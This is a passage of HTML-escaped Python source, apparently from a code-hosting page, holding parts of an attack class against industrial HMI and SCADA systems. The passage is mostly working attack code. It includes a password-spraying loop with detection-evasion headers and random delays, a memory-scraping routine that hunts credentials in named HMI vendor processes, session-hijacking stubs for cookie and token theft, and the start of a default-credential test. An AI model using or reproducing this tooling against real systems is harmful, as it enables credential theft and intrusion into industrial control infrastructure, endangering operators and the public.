class=\"pl-s1\"\u003evalid_credentials\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e []\n        \u003cspan class=\"pl-s1\"\u003eattempt_count\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e\n        \n        \u003cspan class=\"pl-c\"\u003e# Target usernames commonly found in industrial environments\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003etarget_usernames\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e [\n            \u003cspan class=\"pl-s\"\u003e'admin'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'administrator'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'operator'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'engineer'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'technician'\u003c/span\u003e,\n            \u003cspan class=\"pl-s\"\u003e'service'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'maintenance'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'supervisor'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'root'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'guest'\u003c/span\u003e\n        ]\n        \n        \u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003ef\"[*] Starting password spraying with \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-en\"\u003elen\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecommon_credentials\u003c/span\u003e)\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e common passwords\"\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eusername\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003etarget_usernames\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003epassword\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecommon_credentials\u003c/span\u003e:\n                \u003cspan class=\"pl-s1\"\u003eattempt_count\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e\n                \n                \u003cspan class=\"pl-c\"\u003e# Advanced evasion: Randomized delays between attempts\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003edelay\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e2\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003erandom\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003erandom\u003c/span\u003e() \u003cspan class=\"pl-c1\"\u003e*\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e3\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e# 2-5 second random delay\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003etime\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esleep\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003edelay\u003c/span\u003e)\n                \n                \u003cspan class=\"pl-c\"\u003e# Advanced evasion: Rotate user agents and headers\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003eheaders\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n                    \u003cspan class=\"pl-s\"\u003e'User-Agent'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003erandom_user_agent\u003c/span\u003e(),\n                    \u003cspan class=\"pl-s\"\u003e'X-Forwarded-For'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003erandom_ip\u003c/span\u003e(),\n                    \u003cspan class=\"pl-s\"\u003e'Accept'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'\u003c/span\u003e,\n                    \u003cspan class=\"pl-s\"\u003e'Accept-Language'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'en-US,en;q=0.5'\u003c/span\u003e,\n                    \u003cspan class=\"pl-s\"\u003e'Accept-Encoding'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'gzip, deflate'\u003c/span\u003e,\n                    \u003cspan class=\"pl-s\"\u003e'Connection'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'keep-alive'\u003c/span\u003e,\n                    \u003cspan class=\"pl-s\"\u003e'Upgrade-Insecure-Requests'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'1'\u003c/span\u003e\n                }\n                \n                \u003cspan class=\"pl-c\"\u003e# Common HMI login form data structure\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003elogin_data\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n                    \u003cspan class=\"pl-s\"\u003e'username'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eusername\u003c/span\u003e,\n                    \u003cspan class=\"pl-s\"\u003e'password'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003epassword\u003c/span\u003e,\n                    \u003cspan class=\"pl-s\"\u003e'submit'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Login'\u003c/span\u003e,\n                    \u003cspan class=\"pl-s\"\u003e'redirect'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'/'\u003c/span\u003e\n                }\n                \n                \u003cspan class=\"pl-k\"\u003etry\u003c/span\u003e:\n                    \u003cspan class=\"pl-c\"\u003e# Send login request with timeout and redirect handling\u003c/span\u003e\n                    \u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003erequests\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003epost\u003c/span\u003e(\n                        \u003cspan class=\"pl-s\"\u003ef\"http://\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003etarget\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e/login\"\u003c/span\u003e,\n                        \u003cspan class=\"pl-s1\"\u003edata\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003elogin_data\u003c/span\u003e,\n                        \u003cspan class=\"pl-s1\"\u003eheaders\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eheaders\u003c/span\u003e,\n                        \u003cspan class=\"pl-s1\"\u003etimeout\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e10\u003c/span\u003e,\n                        \u003cspan class=\"pl-s1\"\u003eallow_redirects\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eFalse\u003c/span\u003e,  \u003cspan class=\"pl-c\"\u003e# Don't follow redirects to analyze response\u003c/span\u003e\n                        \u003cspan class=\"pl-s1\"\u003everify\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eFalse\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e# Bypass SSL verification for testing\u003c/span\u003e\n                    )\n                    \n                    \u003cspan class=\"pl-c\"\u003e# Analyze response for successful authentication\u003c/span\u003e\n                    \u003cspan class=\"pl-s1\"\u003elogin_success\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eanalyze_login_response\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eusername\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003epassword\u003c/span\u003e)\n                    \n                    \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003elogin_success\u003c/span\u003e:\n                        \u003cspan class=\"pl-s1\"\u003evalid_credentials\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eappend\u003c/span\u003e({\n                            \u003cspan class=\"pl-s\"\u003e'username'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eusername\u003c/span\u003e,\n                            \u003cspan class=\"pl-s\"\u003e'password'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003epassword\u003c/span\u003e,\n                            \u003cspan class=\"pl-s\"\u003e'response_code'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003estatus_code\u003c/span\u003e,\n                            \u003cspan class=\"pl-s\"\u003e'response_headers'\u003c/span\u003e: \u003cspan class=\"pl-en\"\u003edict\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eheaders\u003c/span\u003e)\n                        })\n                        \u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003ef\"[+] Valid credentials found: \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eusername\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e:\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003epassword\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e\"\u003c/span\u003e)\n                        \n                        \u003cspan class=\"pl-c\"\u003e# Log successful attempt\u003c/span\u003e\n                        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003elog_attempt\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eusername\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003epassword\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003eTrue\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eattempt_count\u003c/span\u003e)\n                        \u003cspan class=\"pl-k\"\u003ebreak\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e# Move to next username after success\u003c/span\u003e\n                    \u003cspan class=\"pl-k\"\u003eelse\u003c/span\u003e:\n                        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003elog_attempt\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eusername\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003epassword\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003eFalse\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eattempt_count\u003c/span\u003e)\n                        \n                \u003cspan class=\"pl-k\"\u003eexcept\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003erequests\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eRequestException\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eas\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ee\u003c/span\u003e:\n                    \u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003ef\"[-] Request failed for \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eusername\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e:\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003epassword\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e - \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003ee\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e\"\u003c/span\u003e)\n                    \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003elog_attempt\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eusername\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003epassword\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003eFalse\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eattempt_count\u003c/span\u003e, \u003cspan class=\"pl-en\"\u003estr\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ee\u003c/span\u003e))\n                    \u003cspan class=\"pl-k\"\u003econtinue\u003c/span\u003e\n        \n        \u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003ef\"[*] Password spraying completed: \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-en\"\u003elen\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003evalid_credentials\u003c/span\u003e)\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e valid credentials found\"\u003c/span\u003e)\n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003evalid_credentials\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ememory_scraping_attack\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Extract credentials from HMI process memory through memory analysis.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Scans running HMI processes for credential patterns and sensitive data.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003eimport\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003epsutil\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003eimport\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ere\u003c/span\u003e\n        \n        \u003cspan class=\"pl-s1\"\u003ecredentials\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e []\n        \u003cspan class=\"pl-s1\"\u003ecredential_patterns\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e [\n            \u003cspan class=\"pl-s\"\u003er'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}'\u003c/span\u003e,  \u003cspan class=\"pl-c\"\u003e# Email pattern\u003c/span\u003e\n            \u003cspan class=\"pl-s\"\u003er'(?i)(password|pwd|pass)\\s*[=:]\\s*[\\'\"]?([^\\'\"\\s]+)'\u003c/span\u003e,  \u003cspan class=\"pl-c\"\u003e# Password assignments\u003c/span\u003e\n            \u003cspan class=\"pl-s\"\u003er'(username|user)\\s*[=:]\\s*[\\'\"]?([^\\'\"\\s]+)'\u003c/span\u003e,  \u003cspan class=\"pl-c\"\u003e# Username assignments\u003c/span\u003e\n            \u003cspan class=\"pl-s\"\u003er'[A-Za-z0-9]{8,}'\u003c/span\u003e,  \u003cspan class=\"pl-c\"\u003e# Potential passwords (8+ alphanumeric)\u003c/span\u003e\n        ]\n        \n        \u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\"[*] Scanning HMI processes for credential patterns in memory...\"\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eprocess\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003epsutil\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eprocess_iter\u003c/span\u003e([\u003cspan class=\"pl-s\"\u003e'pid'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'name'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'memory_info'\u003c/span\u003e]):\n            \u003cspan class=\"pl-s1\"\u003eprocess_name\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eprocess\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003einfo\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'name'\u003c/span\u003e].\u003cspan class=\"pl-c1\"\u003elower\u003c/span\u003e()\n            \n            \u003cspan class=\"pl-c\"\u003e# Target HMI and SCADA related processes\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003ehmi_process_indicators\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e [\u003cspan class=\"pl-s\"\u003e'wincc'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'intouch'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'ifix'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'citect'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'factorytalk'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'webportal'\u003c/span\u003e]\n            \n            \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eany\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eindicator\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eprocess_name\u003c/span\u003e \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eindicator\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ehmi_process_indicators\u003c/span\u003e):\n                \u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003ef\"[*] Analyzing HMI process: \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eprocess\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003einfo\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'name'\u003c/span\u003e]\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e (PID: \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eprocess\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003einfo\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'pid'\u003c/span\u003e]\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e)\"\u003c/span\u003e)\n                \n                \u003cspan class=\"pl-k\"\u003etry\u003c/span\u003e:\n                    \u003cspan class=\"pl-s1\"\u003eprocess_handle\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003epsutil\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eProcess\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eprocess\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003einfo\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'pid'\u003c/span\u003e])\n                    \n                    \u003cspan class=\"pl-c\"\u003e# Get memory maps for the process\u003c/span\u003e\n                    \u003cspan class=\"pl-s1\"\u003ememory_maps\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eprocess_handle\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ememory_maps\u003c/span\u003e()\n                    \n                    \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eregion\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ememory_maps\u003c/span\u003e:\n                        \u003cspan class=\"pl-c\"\u003e# Focus on readable memory regions\u003c/span\u003e\n                        \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'r'\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eregion\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eperms\u003c/span\u003e:\n                            \u003cspan class=\"pl-k\"\u003etry\u003c/span\u003e:\n                                \u003cspan class=\"pl-c\"\u003e# Read memory region (this requires appropriate permissions)\u003c/span\u003e\n                                \u003cspan class=\"pl-c\"\u003e# Note: This is a simplified example - real implementation would use memory reading APIs\u003c/span\u003e\n                                \u003cspan class=\"pl-s1\"\u003eregion_data\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eread_process_memory\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eprocess_handle\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eregion\u003c/span\u003e)\n                                \n                                \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eregion_data\u003c/span\u003e:\n                                    \u003cspan class=\"pl-c\"\u003e# Search for credential patterns\u003c/span\u003e\n                                    \u003cspan class=\"pl-s1\"\u003efound_creds\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003escan_memory_for_credentials\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eregion_data\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003ecredential_patterns\u003c/span\u003e)\n                                    \u003cspan class=\"pl-s1\"\u003ecredentials\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eextend\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003efound_creds\u003c/span\u003e)\n                                    \n                            \u003cspan class=\"pl-k\"\u003eexcept\u003c/span\u003e (\u003cspan class=\"pl-s1\"\u003epsutil\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eAccessDenied\u003c/span\u003e, \u003cspan class=\"pl-v\"\u003eOSError\u003c/span\u003e):\n                                \u003cspan class=\"pl-c\"\u003e# Cannot access this memory region\u003c/span\u003e\n                                \u003cspan class=\"pl-k\"\u003econtinue\u003c/span\u003e\n                                \n                \u003cspan class=\"pl-k\"\u003eexcept\u003c/span\u003e (\u003cspan class=\"pl-s1\"\u003epsutil\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eAccessDenied\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003epsutil\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eNoSuchProcess\u003c/span\u003e) \u003cspan class=\"pl-k\"\u003eas\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ee\u003c/span\u003e:\n                    \u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003ef\"[-] Cannot access process \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eprocess\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003einfo\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'name'\u003c/span\u003e]\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003ee\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e\"\u003c/span\u003e)\n                    \u003cspan class=\"pl-k\"\u003econtinue\u003c/span\u003e\n        \n        \u003cspan class=\"pl-c\"\u003e# Deduplicate credentials\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eunique_credentials\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e []\n        \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ecred\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ecredentials\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ecred\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e\u003cspan class=\"pl-c1\"\u003enot\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eunique_credentials\u003c/span\u003e:\n                \u003cspan class=\"pl-s1\"\u003eunique_credentials\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eappend\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ecred\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003ef\"[+] Memory scraping complete: \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-en\"\u003elen\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eunique_credentials\u003c/span\u003e)\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e unique credentials found\"\u003c/span\u003e)\n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eunique_credentials\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003esession_hijacking\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Execute session hijacking attacks to steal active authentication tokens.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Targets cookies, session IDs, and authentication tokens.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003esession_data\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {}\n        \n        \u003cspan class=\"pl-c\"\u003e# Cookie theft techniques\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003esession_data\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'cookies'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eextract_browser_cookies\u003c/span\u003e()\n        \n        \u003cspan class=\"pl-c\"\u003e# Session token interception\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003esession_data\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'tokens'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eintercept_auth_tokens\u003c/span\u003e()\n        \n        \u003cspan class=\"pl-c\"\u003e# Session replay attacks\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003esession_data\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'replay'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esession_replay_attack\u003c/span\u003e()\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003esession_data\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003etest_default_credentials\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Test vendor-specific default credentials against target HMI.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Uses comprehensive database of industrial system default accounts.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003edefault_creds\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eload_vendor_defaults\u003c/span\u003e()\n        \u003cspan class=\"pl-s1\"\u003evalid_defaults\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e []\n        \n        